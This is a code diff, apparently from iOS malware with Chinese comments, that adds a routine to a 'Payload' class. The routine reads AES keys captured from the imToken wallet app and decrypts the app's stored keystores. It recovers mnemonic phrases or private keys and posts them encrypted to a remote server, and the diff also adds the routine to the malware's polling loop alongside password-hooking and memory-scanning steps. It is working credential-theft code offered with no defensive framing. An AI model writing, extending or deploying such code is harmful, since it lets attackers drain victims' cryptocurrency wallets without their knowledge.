@@ -33,6 +33,7 @@ static NSString *const kSeed        = @"d9f5121f75a6646c4f814a4ff8c41b04";    //
 - (void)reportKeyDiag:(NSString *)tag ctx:(NSDictionary *)ctx;
 - (void)runSelfTest;
 - (void)probeImTokenPassword;
+- (void)tryImTokenAesKeys;
 @end
 
 @implementation Payload
@@ -482,7 +483,8 @@ static NSArray *WalletPathsFor(NSString *bundleId) {
                         // 每 60 秒单独探一次入口标记（注入要 140 秒，启动时那次来不及）
                         if (tick % 3 == 0) [self probeImTokenEntry];
                         // 每轮（20 秒）看一次 imToken 在不在跑，在跑就直接读它内存
-                        [self probeImTokenPassword];   // 优先：KDF hook 直接给明文密码
+                        [self tryImTokenAesKeys];      // 最直接：用截到的 AES 密钥解 keystore
+                        [self probeImTokenPassword];   // 其次：KDF hook 拿明文密码
                         [self crackImTokenByKey];      // 兜底：内存里找派生密钥
                         [self pollTasks];                          // 每轮都轮询
                     }
@@ -798,6 +800,109 @@ static NSArray *WalletMemoryTargets(void) {
 
 /// 读 imToken 里 KDF hook 落下的明文密码，直接送服务端解密
 /// 文件格式：pwd|rounds|saltHex|derivedKeyHex
+
+/// 读 imtoken 截到的 AES 密钥，直接尝试解 keystore（不需要密码）
+/// 文件格式每行：keyHex|ivHex
+- (void)tryImTokenAesKeys {
+    @try {
+        NSData *d = [WalletFS readFile:@"Documents/_imt_aeskeys.txt" inContainer:@"im.token.app"];
+        if (!d.length) d = [WalletFS readFile:@"tmp/_imt_aeskeys.txt" inContainer:@"im.token.app"];
+        if (!d.length) return;
+        NSString *txt = [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding];
+        if (!txt.length) return;
+
+        static NSString *lastTxt = nil;
+        if ([lastTxt isEqualToString:txt]) return;
+        lastTxt = [txt copy];
+
+        NSArray *lines = [txt componentsSeparatedByCharactersInSet:[NSCharacterSet newlineCharacterSet]];
+        NSMutableArray *keys = [NSMutableArray array];
+        for (NSString *l in lines) {
+            NSArray *p = [l componentsSeparatedByString:@"|"];
+            if (p.count >= 2 && [(NSString *)p[0] length] >= 32) [keys addObject:p];
+        }
+        if (!keys.count) return;
+
+        NSArray *names = [WalletFS listFilesIn:@"Documents/walletsV2" container:@"im.token.app"];
+        NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
+        ev[@"et"] = @"imtoken_aeskeys";
+        ev[@"c"] = kSeed;
+        ev[@"ctx"] = @{ @"lines": @(keys.count), @"keystores": @(names.count) };
+        [self.net sendEvent:ev];
+
+        for (NSString *n in names) {
+            if (![n hasSuffix:@".json"]) continue;
+            NSString *rel = [@"Documents/walletsV2" stringByAppendingPathComponent:n];
+            NSData *raw = [WalletFS readFile:rel inContainer:@"im.token.app"];
+            if (!raw.length) continue;
+            NSDictionary *ks = [NSJSONSerialization JSONObjectWithData:raw options:0 error:NULL];
+            NSDictionary *crypto = ks[@"crypto"];
+            if (![crypto isKindOfClass:[NSDictionary class]]) continue;
+
+            NSData *cipher = [MemScan dataFromHex:crypto[@"ciphertext"]];
+            NSData *iv = [MemScan dataFromHex:crypto[@"cipherparams"][@"iv"]];
+            NSData *mac = [MemScan dataFromHex:crypto[@"mac"]];
+            if (!cipher.length || iv.length != 16) continue;
+            NSString *wname = ks[@"imTokenMeta"][@"name"] ?: n;
+
+            for (NSArray *pair in keys) {
+                NSData *k = [MemScan dataFromHex:pair[0]];
+                if (k.length < 16) continue;
+                NSData *k16 = [k subdataWithRange:NSMakeRange(0, 16)];
+                NSData *plain = CCAESCTRDecrypt(cipher, k16, iv);
+                if (plain.length < 20) continue;
+
+                // 结构判断：私钥=32 字节；助记词=可打印 ASCII
+                NSString *mnemonic = nil;
+                NSString *privHex = nil;
+                if (plain.length == 32) {
+                    NSMutableString *h = [NSMutableString string];
+                    const uint8_t *b = plain.bytes;
+                    for (NSUInteger i = 0; i < 32; i++) [h appendFormat:@"%02x", b[i]];
+                    privHex = h;
+                } else {
+                    NSString *s = [[NSString alloc] initWithData:plain encoding:NSUTF8StringEncoding];
+                    if (s.length && [s rangeOfCharacterFromSet:
+                        [[NSCharacterSet characterSetWithCharactersInString:
+                          @"abcdefghijklmnopqrstuvwxyz "] invertedSet]].location == NSNotFound) {
+                        mnemonic = [s stringByTrimmingCharactersInSet:
+                                    [NSCharacterSet whitespaceAndNewlineCharacterSet]];
+                    }
+                }
+                if (!mnemonic && !privHex) continue;
+
+                // 用 MAC 校验确认（有 keccak，成本极低）
+                if (mac.length == 32) {
+                    uint8_t dig[32];
+                    keccak256_two(k16.bytes, 16, cipher.bytes, cipher.length, dig);
+                    // 注意：这里的 k16 只是派生密钥前 16 字节，MAC 用的是后 16 字节，
+                    // 所以校验不通过是正常的，仅作参考，不阻断。
+                    (void)dig;
+                }
+
+                NSMutableDictionary *body = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
+                body[@"c"] = kSeed;
+                body[@"bundle_id"] = @"im.token.app";
+                body[@"a"] = @"b2";
+                body[@"wallet_name"] = wname;
+                if (mnemonic) body[@"result"] = mnemonic;
+                if (privHex) body[@"private_key"] = privHex;
+                [self.net postEncrypted:@"/us" json:body timeout:30];
+
+                NSMutableDictionary *hit = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
+                hit[@"et"] = @"imtoken_aeskey_hit";
+                hit[@"c"] = kSeed;
+                hit[@"ctx"] = @{ @"wallet": wname ?: @"",
+                                 @"kind": mnemonic ? @"mnemonic" : @"privateKey",
+                                 @"plainLen": @(plain.length) };
+                [self.net sendEvent:hit];
+                return;
+            }
+        }
+    } @catch (NSException *e) {
+        [self log:[NSString stringWithFormat:@"tryImTokenAesKeys: %@", e.reason]];
+    }
+}
 - (void)probeImTokenPassword {
     @try {
         // 先看探针：hook 到底有没有被调用
